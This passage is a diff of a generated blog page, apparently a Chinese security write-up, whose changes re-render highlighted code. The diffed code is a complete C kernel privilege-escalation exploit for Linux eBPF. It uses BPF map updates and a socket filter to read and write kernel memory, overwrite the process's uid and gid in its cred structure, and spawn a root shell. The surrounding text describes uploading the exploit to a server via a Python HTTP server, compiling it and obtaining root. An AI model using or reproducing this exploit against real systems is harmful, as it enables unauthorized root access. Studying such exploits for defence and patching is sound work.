+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_UPDATE_ELEM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_lookup_elem</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">map_fd</span> <span class="o">=</span> <span class="n">mapfd</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">key</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">value</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_LOOKUP_ELEM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">__exit</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;error: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">prep</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mapfd</span> <span class="o">=</span> <span class="n">bpf_create_map</span><span class="p">(</span><span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">),</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="p">),</span> <span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">mapfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">progfd</span> <span class="o">=</span> <span class="n">bpf_prog_load</span><span class="p">(</span><span class="n">BPF_PROG_TYPE_SOCKET_FILTER</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="p">)</span><span class="n">__prog</span><span class="p">,</span> <span class="n">PROGSIZE</span><span class="p">,</span> <span class="s">&#34;GPL&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">progfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sockets</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_ATTACH_BPF</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">progfd</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">progfd</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">writemsg</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ssize_t</span> <span class="n">n</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;write&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;short write: %lu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define __update_elem(a, b, c) \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    bpf_update_elem(0, (a)); \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    bpf_update_elem(1, (b)); \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    bpf_update_elem(2, (c)); \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    writemsg();
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">get_value</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">bpf_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">__get_fp</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__update_elem</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">get_value</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">__read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__update_elem</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">get_value</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">__write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__update_elem</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">get_sp</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x4000</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">,</span> <span class="n">credptr</span><span class="p">,</span> <span class="n">uidptr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">fp</span> <span class="o">=</span> <span class="n">__get_fp</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;bogus fp&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">sp</span> <span class="o">=</span> <span class="n">get_sp</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">sp</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;bogus sp&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">task_struct</span> <span class="o">=</span> <span class="n">__read</span><span class="p">(</span><span class="n">sp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">task_struct</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;bogus task ptr&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;task_struct = %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">credptr</span> <span class="o">=</span> <span class="n">__read</span><span class="p">(</span><span class="n">task_struct</span> <span class="o">+</span> <span class="n">CRED_OFFSET</span><span class="p">);</span> <span class="c1">// cred
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">credptr</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;bogus cred ptr&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">uidptr</span> <span class="o">=</span> <span class="n">credptr</span> <span class="o">+</span> <span class="n">UID_OFFSET</span><span class="p">;</span> <span class="c1">// uid
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">uidptr</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;bogus uid ptr&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;uidptr = %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">uidptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__write</span><span class="p">(</span><span class="n">uidptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// set both uid and gid to 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;spawning root shell</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;not vulnerable?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prep</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pwn</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>将 exp 文件上传到服务器：
 本机执行 <code>python -m SimpleHTTPServer 80</code>
@@ -888,8 +888,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gcc exp.c
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc exp.c
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>得到可执行文件，执行后，得到 root 的 shell
 <img
@@ -929,7 +929,7 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
